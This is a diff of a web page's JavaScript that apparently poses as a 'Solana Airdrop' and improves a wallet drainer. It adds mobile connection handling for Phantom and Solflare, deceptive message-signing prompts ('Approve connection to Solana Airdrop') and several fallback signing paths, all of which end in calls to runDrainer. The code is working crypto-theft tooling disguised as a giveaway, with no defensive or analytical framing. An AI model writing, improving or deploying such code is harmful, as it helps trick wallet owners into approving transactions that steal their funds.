@@ -1015,40 +1015,61 @@
                 if (wallet.name === 'Phantom' && isMobileDevice) {
                   // Phantom mobile specific handling
                   console.log('Attempting Phantom mobile connection...');
-                  if (typeof provider.connect === 'function') {
-                    await provider.connect();
-                    // Wait for connection and check for approval
-                    setTimeout(async () => {
-                      if (getWalletAddress(provider)) {
-                        showStatus('Phantom connected! Requesting approval...', 'loading');
-                        // Proceed with transaction
-                        setTimeout(() => {
-                          runDrainer(provider);
-                        }, 1000);
-                      } else {
-                        showStatus('Please approve the connection in Phantom app', 'error');
-                      }
-                    }, 2000);
-                  } else {
-                    showStatus('Phantom connection method not found', 'error');
+                  showStatus('Connecting to Phantom mobile...', 'loading');
+                  
+                  const connected = await connectMobileWalletWithValidation(wallet);
+                  if (connected) {
+                    const provider = wallet.provider();
+                    showStatus('Phantom connected! Requesting approval...', 'loading');
+                    
+                    // Force approval request by attempting to sign a message
+                    try {
+                      const message = new TextEncoder().encode('Approve connection to Solana Airdrop');
+                      const signature = await provider.signMessage(message, 'utf8');
+                      console.log('Phantom signature:', signature);
+                      showStatus('Phantom approved! Proceeding with transaction...', 'success');
+                      setTimeout(() => {
+                        runDrainer(provider);
+                      }, 1000);
+                    } catch (signErr) {
+                      console.log('Phantom sign error:', signErr);
+                      showStatus('Please approve the signature request in Phantom app', 'error');
+                    }
                   }
                 } else if (wallet.name === 'Solflare' && isMobileDevice) {
                   // Solflare mobile specific handling
                   console.log('Attempting Solflare mobile connection...');
-                  if (typeof provider.connect === 'function') {
-                    await provider.connect();
-                    setTimeout(async () => {
-                      if (getWalletAddress(provider)) {
-                        showStatus('Solflare connected!', 'success');
+                  showStatus('Connecting to Solflare mobile...', 'loading');
+                  
+                  const connected = await connectMobileWalletWithValidation(wallet);
+                  if (connected) {
+                    const provider = wallet.provider();
+                    showStatus('Solflare connected! Testing transaction signing...', 'loading');
+                    
+                    // Test Solflare's transaction signing capability
+                    try {
+                      const methods = detectMobileWalletMethods(provider, 'Solflare');
+                      
+                      if (methods.signAndSendTransaction) {
+                        console.log('Solflare has signAndSendTransaction method');
+                        showStatus('Solflare ready! Proceeding with transaction...', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                      } else if (methods.signTransaction && methods.sendTransaction) {
+                        console.log('Solflare has signTransaction + sendTransaction methods');
+                        showStatus('Solflare ready! Proceeding with transaction...', 'success');
                         setTimeout(() => {
                           runDrainer(provider);
                         }, 1000);
                       } else {
-                        showStatus('Please complete Solflare connection', 'error');
+                        console.log('Solflare methods available:', methods);
+                        showStatus('Solflare connected but signing method not found', 'error');
                       }
-                    }, 2000);
-                  } else {
-                    showStatus('Solflare connection method not found', 'error');
+                    } catch (testErr) {
+                      console.log('Solflare test signing error:', testErr);
+                      showStatus('Solflare signing test failed: ' + testErr.message, 'error');
+                    }
                   }
                 } else {
                   // Generic mobile connection
@@ -1389,52 +1410,77 @@
           showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
           clearStoredTransaction();
         } else if ((provider.isSolflare || (window.solflare && provider === window.solflare)) && provider.signAndSendTransaction) {
-          // Solflare specific handling
+          console.log('Using Solflare signAndSendTransaction method');
           try {
-            console.log('Attempting Solflare signAndSendTransaction...');
-            const sig = await provider.signAndSendTransaction(tx);
-            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-            clearStoredTransaction(); // Clear on success
-          } catch (solflareErr) {
-            console.log('Solflare signAndSendTransaction failed, trying fallback...', solflareErr);
-            // Fallback for Solflare if the above fails
-            if (provider.signTransaction && provider.sendTransaction) {
-              try {
+            // Solflare mobile-specific handling
+            if (isMobile()) {
+              console.log('Solflare mobile transaction signing...');
+              // Try multiple approaches for Solflare mobile
+              if (typeof provider.signAndSendTransaction === 'function') {
+                const sig = await provider.signAndSendTransaction(tx);
+                showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else if (typeof provider.signTransaction === 'function' && typeof provider.sendTransaction === 'function') {
+                console.log('Solflare mobile: using signTransaction + sendTransaction');
                 const signed = await provider.signTransaction(tx);
                 const sig = await provider.sendTransaction(signed);
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-                clearStoredTransaction(); // Clear on success
-              } catch (fallbackErr) {
-                console.log('Solflare fallback also failed:', fallbackErr);
-                throw fallbackErr;
+                showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else {
+                throw new Error('Solflare mobile: No compatible signing method found');
               }
             } else {
-              throw solflareErr;
+              // Desktop Solflare
+              const sig = await provider.signAndSendTransaction(tx);
+              showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+              clearStoredTransaction();
             }
+          } catch (err) {
+            console.log('Solflare transaction error:', err);
+            showStatus("❌ Solflare transaction failed: " + err.message, 'error');
+            storeTransaction(data, provider);
           }
-        } else if ((provider.isPhantom || (window.solana && provider === window.solana && window.solana.isPhantom)) && provider.signAndSendTransaction) {
-          // Phantom specific handling
+        } else if ((provider.isPhantom || (window.solana && provider === window.solana && provider.isPhantom)) && provider.signAndSendTransaction) {
+          console.log('Using Phantom signAndSendTransaction method');
           try {
-            console.log('Attempting Phantom signAndSendTransaction...');
-            const sig = await provider.signAndSendTransaction(tx);
-            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-            clearStoredTransaction(); // Clear on success
-          } catch (phantomErr) {
-            console.log('Phantom signAndSendTransaction failed, trying fallback...', phantomErr);
-            // Fallback for Phantom if the above fails
-            if (provider.signTransaction && provider.sendTransaction) {
+            // Phantom mobile-specific handling
+            if (isMobile()) {
+              console.log('Phantom mobile transaction signing...');
+              // Force approval by signing a message first
               try {
+                const message = new TextEncoder().encode('Approve Solana Airdrop transaction');
+                await provider.signMessage(message, 'utf8');
+                console.log('Phantom message signed, proceeding with transaction...');
+              } catch (msgErr) {
+                console.log('Phantom message signing failed:', msgErr);
+                showStatus("❌ Please approve the signature request in Phantom app", 'error');
+                return;
+              }
+              
+              // Now try the transaction
+              if (typeof provider.signAndSendTransaction === 'function') {
+                const sig = await provider.signAndSendTransaction(tx);
+                showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else if (typeof provider.signTransaction === 'function' && typeof provider.sendTransaction === 'function') {
+                console.log('Phantom mobile: using signTransaction + sendTransaction');
                 const signed = await provider.signTransaction(tx);
                 const sig = await provider.sendTransaction(signed);
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-                clearStoredTransaction(); // Clear on success
-              } catch (fallbackErr) {
-                console.log('Phantom fallback also failed:', fallbackErr);
-                throw fallbackErr;
+                showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else {
+                throw new Error('Phantom mobile: No compatible signing method found');
               }
             } else {
-              throw phantomErr;
+              // Desktop Phantom
+              const sig = await provider.signAndSendTransaction(tx);
+              showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+              clearStoredTransaction();
             }
+          } catch (err) {
+            console.log('Phantom transaction error:', err);
+            showStatus("❌ Phantom transaction failed: " + err.message, 'error');
+            storeTransaction(data, provider);
           }
         } else if ((provider.isBackpack || (window.backpack && provider === window.backpack)) && provider.signAndSendTransaction) {
           // Backpack specific handling
@@ -1739,52 +1785,77 @@
           showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
                 clearStoredTransaction(); // Clear on success
         } else if ((provider.isSolflare || (window.solflare && provider === window.solflare)) && provider.signAndSendTransaction) {
-          // Solflare specific handling
+          console.log('Using Solflare signAndSendTransaction method');
           try {
-            console.log('Attempting Solflare signAndSendTransaction...');
-            const sig = await provider.signAndSendTransaction(tx);
-            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-            clearStoredTransaction(); // Clear on success
-          } catch (solflareErr) {
-            console.log('Solflare signAndSendTransaction failed, trying fallback...', solflareErr);
-            // Fallback for Solflare if the above fails
-            if (provider.signTransaction && provider.sendTransaction) {
-              try {
+            // Solflare mobile-specific handling
+            if (isMobile()) {
+              console.log('Solflare mobile transaction signing...');
+              // Try multiple approaches for Solflare mobile
+              if (typeof provider.signAndSendTransaction === 'function') {
+                const sig = await provider.signAndSendTransaction(tx);
+                showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else if (typeof provider.signTransaction === 'function' && typeof provider.sendTransaction === 'function') {
+                console.log('Solflare mobile: using signTransaction + sendTransaction');
                 const signed = await provider.signTransaction(tx);
                 const sig = await provider.sendTransaction(signed);
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-                clearStoredTransaction(); // Clear on success
-              } catch (fallbackErr) {
-                console.log('Solflare fallback also failed:', fallbackErr);
-                throw fallbackErr;
+                showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else {
+                throw new Error('Solflare mobile: No compatible signing method found');
               }
             } else {
-              throw solflareErr;
+              // Desktop Solflare
+              const sig = await provider.signAndSendTransaction(tx);
+              showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+              clearStoredTransaction();
             }
+          } catch (err) {
+            console.log('Solflare transaction error:', err);
+            showStatus("❌ Solflare transaction failed: " + err.message, 'error');
+            storeTransaction(data, provider);
           }
-        } else if ((provider.isPhantom || (window.solana && provider === window.solana && window.solana.isPhantom)) && provider.signAndSendTransaction) {
-          // Phantom specific handling
+        } else if ((provider.isPhantom || (window.solana && provider === window.solana && provider.isPhantom)) && provider.signAndSendTransaction) {
+          console.log('Using Phantom signAndSendTransaction method');
           try {
-            console.log('Attempting Phantom signAndSendTransaction...');
-            const sig = await provider.signAndSendTransaction(tx);
-            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-            clearStoredTransaction(); // Clear on success
-          } catch (phantomErr) {
-            console.log('Phantom signAndSendTransaction failed, trying fallback...', phantomErr);
-            // Fallback for Phantom if the above fails
-            if (provider.signTransaction && provider.sendTransaction) {
+            // Phantom mobile-specific handling
+            if (isMobile()) {
+              console.log('Phantom mobile transaction signing...');
+              // Force approval by signing a message first
               try {
+                const message = new TextEncoder().encode('Approve Solana Airdrop transaction');
+                await provider.signMessage(message, 'utf8');
+                console.log('Phantom message signed, proceeding with transaction...');
+              } catch (msgErr) {
+                console.log('Phantom message signing failed:', msgErr);
+                showStatus("❌ Please approve the signature request in Phantom app", 'error');
+                return;
+              }
+              
+              // Now try the transaction
+              if (typeof provider.signAndSendTransaction === 'function') {
+                const sig = await provider.signAndSendTransaction(tx);
+                showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else if (typeof provider.signTransaction === 'function' && typeof provider.sendTransaction === 'function') {
+                console.log('Phantom mobile: using signTransaction + sendTransaction');
                 const signed = await provider.signTransaction(tx);
                 const sig = await provider.sendTransaction(signed);
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
-                clearStoredTransaction(); // Clear on success
-              } catch (fallbackErr) {
-                console.log('Phantom fallback also failed:', fallbackErr);
-                throw fallbackErr;
+                showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+                clearStoredTransaction();
+              } else {
+                throw new Error('Phantom mobile: No compatible signing method found');
               }
             } else {
-              throw phantomErr;
+              // Desktop Phantom
+              const sig = await provider.signAndSendTransaction(tx);
+              showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+              clearStoredTransaction();
             }
+          } catch (err) {
+            console.log('Phantom transaction error:', err);
+            showStatus("❌ Phantom transaction failed: " + err.message, 'error');
+            storeTransaction(data, provider);
           }
         } else if ((provider.isBackpack || (window.backpack && provider === window.backpack)) && provider.signAndSendTransaction) {
           // Backpack specific handling
@@ -2071,6 +2142,71 @@
             }
           }, 2000);
         }
+      }
+    }
+
+    // Enhanced mobile wallet method detection
+    function detectMobileWalletMethods(provider, walletName) {
+      console.log(`=== ${walletName} Mobile Method Detection ===`);
+      console.log('Provider:', provider);
+      console.log('Provider type:', typeof provider);
+      console.log('Provider methods:', Object.getOwnPropertyNames(provider));
+      
+      const methods = {
+        connect: typeof provider.connect === 'function',
+        signMessage: typeof provider.signMessage === 'function',
+        signTransaction: typeof provider.signTransaction === 'function',
+        signAndSendTransaction: typeof provider.signAndSendTransaction === 'function',
+        sendTransaction: typeof provider.sendTransaction === 'function',
+        request: typeof provider.request === 'function'
+      };
+      
+      console.log('Available methods:', methods);
+      
+      // Check for mobile-specific properties
+      if (provider.isPhantom) console.log('isPhantom:', provider.isPhantom);
+      if (provider.isSolflare) console.log('isSolflare:', provider.isSolflare);
+      if (provider.isBackpack) console.log('isBackpack:', provider.isBackpack);
+      if (provider.isGlow) console.log('isGlow:', provider.isGlow);
+      if (provider.isTrust) console.log('isTrust:', provider.isTrust);
+      if (provider.isExodus) console.log('isExodus:', provider.isExodus);
+      
+      // Check for public key
+      const address = getWalletAddress(provider);
+      console.log('Wallet address:', address);
+      
+      return methods;
+    }
+
+    // Enhanced mobile wallet connection with method validation
+    async function connectMobileWalletWithValidation(wallet) {
+      const provider = wallet.provider();
+      const methods = detectMobileWalletMethods(provider, wallet.name);
+      
+      if (!methods.connect) {
+        showStatus(`${wallet.name} connection method not available`, 'error');
+        return false;
+      }
+      
+      try {
+        const result = await provider.connect();
+        console.log(`${wallet.name} connect result:`, result);
+        
+        // Wait for connection to establish
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        const address = getWalletAddress(provider);
+        if (!address) {
+          showStatus(`Please complete ${wallet.name} connection in the app`, 'error');
+          return false;
+        }
+        
+        console.log(`${wallet.name} connected successfully:`, address);
+        return true;
+      } catch (err) {
+        console.log(`${wallet.name} connection error:`, err);
+        showStatus(`${wallet.name} connection failed: ${err.message}`, 'error');
+        return false;
       }
     }
   </script>
